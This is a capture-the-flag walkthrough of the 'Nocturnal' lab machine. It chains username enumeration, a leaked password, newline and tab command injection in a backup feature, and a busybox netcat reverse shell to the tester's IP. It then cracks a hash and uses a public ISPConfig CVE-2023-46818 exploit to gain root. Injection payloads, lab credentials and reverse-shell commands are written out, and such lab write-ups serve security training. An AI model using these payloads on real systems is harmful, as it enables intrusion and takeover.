# 🦉 Nocturnal CTF - Walkthrough
## 🔍 Initial Reconnaissance

I began by running an `nmap` scan on the target machine to identify open ports and services:

```bash
nmap -sC -sV -A 10.10.11.64
```

The scan revealed two open ports:

- **🛡️ Port 22** → SSH (OpenSSH 8.2p1 Ubuntu)
- **🌐 Port 80** → HTTP (nginx 1.18.0 Ubuntu)

I added `nocturnal.htb` to `/etc/hosts` and navigated to the website.

## 🌐 Website Analysis & User Enumeration

The website on port 80 presented a login page with a registration option. After registering an account, I discovered a file upload feature.

I used `gobuster` to enumerate directories and files:

```bash
gobuster dir -u http://nocturnal.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -x php,txt
```

Key directories and files found:
- `/login.php`, `/register.php`, `/view.php`, `/admin.php`, `/uploads`, `/backups`

The file upload feature only allowed specific file types (pdf, doc, docx, xls, xlsx, odt). Uploaded files could be viewed via `view.php` using a `username` and `file` parameter (e.g., `http://nocturnal.htb/view.php?username=user&file=file.pdf`).

I then used `ffuf` to enumerate usernames via the `view.php` page, specifically looking for users who had uploaded `.doc` files:

```bash
ffuf -u "http://nocturnal.htb/view.php?username=FUZZ&file=.doc" -w ~/wordlists/seclists/Usernames/Names/names.txt -fs 2985 -t 100 -H "Cookie: PHPSESSID=..."
```

This scan revealed the user **amanda**. Navigating to `http://nocturnal.htb/view.php?username=amanda&file=privacy.odt`, I found a document (`privacy.odt`) containing her temporary password: `arHkG7HAI68X8s1J`.

I used these credentials to log in as `amanda` on the web service.

## 💥 Command Injection via Backup Feature

As `amanda`, I had access to the `/admin.php` page. Analyzing the source code of this page, I found a backup functionality that allowed me to create a password-protected zip archive. The command executed was:

```
zip -x './backups/*' -r -P " . $password . " " . $backupFile . " . > " . $logFile . " 2>&1 &
```

The `cleanEntry()` function filtered several shell metacharacters (`;`, `&`, `|`, `$`, ` `, ```, `{`, `}`, `&&`), but **did not filter newline characters (`\n`) or tab characters (`\t`)**. This allowed for command injection.

I used a newline character to break out of the `zip` command and execute a new command. The absence of a space character in the blacklist was critical. I found that the **TAB** character (`\t`) could be used as an argument separator instead of a space.

To confirm command injection, I tested by redirecting `id` output to a temporary file:

```
password=mypass
id>/tmp/out.txt
#&backup=
```

This successfully wrote `uid=33(www-data) gid=33(www-data) groups=33(www-data)` to `/tmp/out.txt`, confirming the injection.

### Reverse Shell

I set up a `netcat` listener on my attacking machine:
s
```bash
nc -lnvp 4444
```

Then, I used Burp Suite to intercept the backup request and inject a reverse shell payload using `busybox` (as `nc -e` was disabled and `&` was blacklisted):

```
password=fakepass
busybox	nc	MyIP	4444	-e	/bin/bash
#&backup=
```

Upon sending this POST request, my `netcat` listener caught a connection, granting me a shell as the `www-data` user.

## ➡️ Lateral Movement

From the `www-data` shell, I enumerated users with a bash shell:

```bash
cat /etc/passwd | grep /bash
```
This revealed `tobias` as another user.

I located the application's database in the `nocturnal_database` directory (e.g., `/var/www/nocturnal.htb/nocturnal_database/`). I transferred the database file to my machine (e.g., using `base64` encoding/decoding).

Inside the database, I found the `users` table, which contained the MD5 hash for the user `tobias`. I cracked the hash using `hashcat` with the `rockyou.txt` wordlist:

```bash
hashcat HASH -m 0 /usr/share/wordlists/rockyou.txt
```

The password for `tobias` was `slowmotionapocalypse`. I used these credentials to log in via SSH:

```bash
ssh tobias@nocturnal.htb
```

✅ I successfully logged in as `tobias` and retrieved the **user flag**.

## ⬆️ Privilege Escalation

While enumerating services, I noticed `ISPConfig` running on port `8080` locally:

```bash
ss -tulnp
```
...
`tcp LISTEN 0 4096 127.0.0.1:8080`

I created an SSH tunnel to access this port from my local machine:

```bash
ssh -L 8080:localhost:8080 tobias@nocturnal.htb
```

Navigating to `http://localhost:8080` displayed the `ISPConfig` login page. I attempted to log in using the `admin` username and `tobias`'s password, `slowmotionapocalypse`.

✅ The login was successful, confirming password reuse.

### Exploiting ISPConfig (CVE-2023-46818)

As an authenticated administrator in `ISPConfig`, I could now exploit `CVE-2023-46818`, a PHP Code Injection vulnerability. This vulnerability affects older versions of `ISPConfig` and allows arbitrary PHP code execution via the `language_edit.php` page.
More information: [CVE-2023-46818 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-46818)

I used a publicly available Python exploit for `CVE-2023-46818`:
[Exploit GitHub - CVE-2023-46818](https://github.com/bipbopbup/CVE-2023-46818-python-exploit)

```bash
git clone https://github.com/bipbopbup/CVE-2023-46818-python-exploit
python3 exploit.py http://localhost:8080/login admin slowmotionapocalypse
```

The exploit successfully provided a shell prompt directly as the `root` user, as the `ISPConfig` web server runs with root privileges. From this root shell, I easily retrieved the final **root flag** from `/root/root.txt`.

## 🎯 Conclusion

The **Nocturnal** machine was successfully completed! 🧩

- Initial access obtained through web enumeration, user password discovery, and SSH login.
- Privilege escalation to `www-data` via command injection on the admin backup feature.
- Lateral movement to `tobias` by cracking a database hash.
- Final privilege escalation to `root` through an authenticated PHP code injection vulnerability in `ISPConfig`.
- User and root flags acquired! 🏁

---